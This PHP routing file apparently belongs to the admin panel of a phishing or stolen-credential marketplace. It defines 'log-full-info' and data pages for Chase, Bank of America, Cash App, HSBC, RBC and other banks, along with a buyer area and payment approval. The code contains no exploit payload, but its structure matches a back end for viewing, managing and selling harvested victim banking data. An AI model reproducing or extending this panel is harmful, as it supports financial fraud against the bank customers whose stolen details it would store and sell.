<?php
use Pecee\SimpleRouter\SimpleRouter as Route;
use App\Middleware\AuthMiddleware;

// Public Routes
Route::get('/login', [App\Controllers\AuthController::class, 'login'])->name('login');
Route::post('/login', [App\Controllers\AuthController::class, 'authenticate']);
Route::get('/register', [App\Controllers\AuthController::class, 'register'])->name('register');
Route::post('/register', [App\Controllers\AuthController::class, 'registerPost']);
Route::get('/logout', [App\Controllers\AuthController::class, 'logout']);

// Protected Routes Group
Route::group(['middleware' => AuthMiddleware::class], function () {
    
    // Common Routes
    Route::group(['prefix' => '/api'], function() {
        Route::get('/user/stats', [App\Controllers\UserController::class, 'stats']);
        Route::get('/user/balance', [App\Controllers\BalanceController::class, 'getUserBalance']);
        Route::post('/user/balance/update', [App\Controllers\BalanceController::class, 'updateUserBalance']);
    });

    // Admin Routes
    Route::group(['prefix' => '/admin'], function() {
        // Dashboard
        Route::get('/', [App\Controllers\Admin\AdminController::class, 'AdminMainIndex']);
        Route::get('/main', [App\Controllers\Admin\AdminController::class, 'AdminMainIndex']);
        Route::get('/toolsvis', [App\Controllers\Admin\AdminController::class, 'AdminToolsvisIndex']);
        Route::get('/header', [App\Controllers\Admin\NavbarController::class, 'index']);

        // Bank Management Routes
        Route::group(['prefix' => '/banks'], function() {
            // USA Banks
            Route::group(['prefix' => '/usa'], function() {
                $usaBanks = [
                    'chase', 'huntington', 'citi', 'suntrust', 'woodforest', 
                    'pnc', 'nfcu', 'boa', 'bbva', 'cashapp', 'cashapp-verified'
                ];

                foreach ($usaBanks as $bank) {
                    Route::get("/{$bank}-log-full-info", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Index"]);
                    Route::get("/{$bank}-data", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Data"]);
                    Route::post("/{$bank}-delete", [App\Controllers\Admin\AdminController::class, "delete" . ucfirst($bank)]);
                }
            });

            // UK Banks
            Route::group(['prefix' => '/uk'], function() {
                $ukBanks = ['barclay', 'hsbc', 'llyod'];
                
                foreach ($ukBanks as $bank) {
                    Route::get("/{$bank}-log-full-info", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Index"]);
                    Route::get("/{$bank}-data", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Data"]);
                    Route::post("/{$bank}-delete", [App\Controllers\Admin\AdminController::class, "delete" . ucfirst($bank)]);
                }
            });

            // Canada Banks
            Route::group(['prefix' => '/canada'], function() {
                $canadaBanks = ['rbc', 'td', 'scotia'];
                
                foreach ($canadaBanks as $bank) {
                    Route::get("/{$bank}-log-full-info", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Index"]);
                    Route::get("/{$bank}-data", [App\Controllers\Admin\AdminController::class, "get" . ucfirst($bank) . "Data"]);
                    Route::post("/{$bank}-delete", [App\Controllers\Admin\AdminController::class, "delete" . ucfirst($bank)]);
                }
            });
        });

        // Support Routes
        Route::group(['prefix' => '/tickets'], function () {
            Route::get('/', [App\Controllers\Admin\TicketController::class, 'index']);
            Route::get('/create', [App\Controllers\Admin\TicketController::class, 'create']);
            Route::post('/store', [App\Controllers\Admin\TicketController::class, 'store']);
            Route::get('/show/{id}', [App\Controllers\Admin\TicketController::class, 'show']);
            Route::post('/{id}/update', [App\Controllers\Admin\TicketController::class, 'update']);
            Route::post('/{id}/delete', [App\Controllers\Admin\TicketController::class, 'delete']);
            Route::post('/reply/{id}', [App\Controllers\Admin\TicketController::class, 'reply']);
        });

        // Reports Routes
        Route::group(['prefix' => '/reports'], function () {
            Route::get('/', [App\Controllers\Admin\ReportController::class, 'index']);
            Route::get('/create', [App\Controllers\Admin\ReportController::class, 'create']);
            Route::post('/store', [App\Controllers\Admin\ReportController::class, 'store']);
            Route::get('/show/{id}', [App\Controllers\Admin\ReportController::class, 'show']);
            Route::post('/{id}/update', [App\Controllers\Admin\ReportController::class, 'update']);
            Route::post('/{id}/delete', [App\Controllers\Admin\ReportController::class, 'delete']);
            Route::post('/reply/{id}', [App\Controllers\Admin\ReportController::class, 'reply']);
        });

        // Payment Management
        Route::get('/payments', [App\Controllers\Admin\AdminController::class, 'viewPayments'])->name('admin.payments');
        Route::post('/payments/approve/{id}', [App\Controllers\Admin\AdminController::class, 'approvePayment']);
        Route::post('/payments/reject/{id}', [App\Controllers\Admin\AdminController::class, 'rejectPayment']);
    });

    // Buyer Routes
    Route::group(['prefix' => '/buyer'], function() {
        Route::get('/', [App\Controllers\Buyer\BuyerController::class, 'index']);
        Route::get('/header', [App\Controllers\Buyer\NavbarController::class, 'index']);
        
        // Profile Management
        Route::post('/profile/update', [App\Controllers\UserController::class, 'updateProfile']);
        Route::post('/profile/update-password', [App\Controllers\UserController::class, 'updatePassword']);
    });
});